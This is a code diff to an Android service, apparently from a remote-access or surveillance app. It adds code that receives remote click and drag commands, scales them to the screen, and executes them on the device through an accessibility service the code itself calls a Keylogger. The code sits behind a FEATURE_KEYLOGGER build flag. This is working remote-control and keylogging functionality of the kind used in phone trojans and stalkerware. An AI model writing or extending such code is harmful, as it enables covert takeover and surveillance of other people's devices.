@@ -172,17 +172,39 @@ public class MyService extends Service {
                         // Mouse events require Accessibility Service (Keylogger)
                         // Only process if keylogger feature is also enabled
                         if (BuildConfig.FEATURE_KEYLOGGER) {
-                            if(data.getString("type").compareTo( "click") == 0){
-                                float xPct = Float.parseFloat(values.getString("x"));
-                                float yPct = Float.parseFloat(values.getString("y"));
-                                // Note: click() method is in Keylogger class
-                                // This will only work if Accessibility Service is running
-                            }else{
-                                float x1Pct = Float.parseFloat(values.getString("x1"));
-                                float y1Pct = Float.parseFloat(values.getString("y1"));
-                                float x2Pct = Float.parseFloat(values.getString("x2"));
-                                float y2Pct = Float.parseFloat(values.getString("y2"));
-                                // Note: drag() method is in Keylogger class
+                            // Get the Keylogger service instance
+                            Keylogger keyloggerService = getKeyloggerServiceInstance();
+                            
+                            if (keyloggerService != null) {
+                                if(data.getString("type").compareTo("click") == 0){
+                                    float xPct = Float.parseFloat(values.getString("x"));
+                                    float yPct = Float.parseFloat(values.getString("y"));
+                                    
+                                    // Calculate actual screen coordinates
+                                    float actualX = xPct * realW;
+                                    float actualY = yPct * realH;
+                                    
+                                    // Execute click on device screen
+                                    keyloggerService.click(actualX, actualY);
+                                    Log.d(TAG, "Click executed at: " + actualX + ", " + actualY);
+                                } else {
+                                    float x1Pct = Float.parseFloat(values.getString("x1"));
+                                    float y1Pct = Float.parseFloat(values.getString("y1"));
+                                    float x2Pct = Float.parseFloat(values.getString("x2"));
+                                    float y2Pct = Float.parseFloat(values.getString("y2"));
+                                    
+                                    // Calculate actual screen coordinates
+                                    float actualX1 = x1Pct * realW;
+                                    float actualY1 = y1Pct * realH;
+                                    float actualX2 = x2Pct * realW;
+                                    float actualY2 = y2Pct * realH;
+                                    
+                                    // Execute drag on device screen
+                                    keyloggerService.drag(actualX1, actualY1, actualX2, actualY2);
+                                    Log.d(TAG, "Drag executed: (" + actualX1 + ", " + actualY1 + ") to (" + actualX2 + ", " + actualY2 + ")");
+                                }
+                            } else {
+                                Log.w(TAG, "Keylogger service not available for mouse control");
                             }
                         }
                     } catch (Exception e) {
@@ -276,3 +298,4 @@ public class MyService extends Service {
         super.onDestroy();
     }
 }
+```
